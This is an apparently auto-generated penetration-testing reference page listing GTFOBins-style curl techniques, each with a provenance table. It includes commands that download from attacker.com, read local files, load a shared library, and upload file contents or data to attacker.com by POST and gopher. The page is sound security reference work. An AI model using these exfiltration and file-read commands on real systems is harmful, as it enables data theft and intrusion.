---
parsed_by: focuslocust
source: commands
type: generated
---
# curl Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## curl

Tool page: [curl](../../tools/linux/curl.md)

### download

```text
curl http://attacker.com/path/to/input-file -o /path/to/output-file
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/curl` |
| Evidence | Function example preserved from source parser. |

### file-read

```text
curl file:///path/to/input-file
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/curl` |
| Evidence | Function example preserved from source parser. |

### file-write

```text
echo DATA >/path/to/temp-file
curl file:///path/to/temp-file -o /path/to/output-file
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/curl` |
| Evidence | Function example preserved from source parser. |

### library-load

```text
curl --engine /path/to/lib.so x
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/curl` |
| Evidence | Function example preserved from source parser. |

### upload

```text
curl -X POST --data-binary @/path/to/input-file http://attacker.com
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/curl` |
| Evidence | Function example preserved from source parser. |

### upload

```text
curl -X POST --data-binary DATA http://attacker.com
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/curl` |
| Evidence | Function example preserved from source parser. |

### upload

```text
curl gopher://attacker.com:12345/_DATA
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/curl` |
| Evidence | Function example preserved from source parser. |
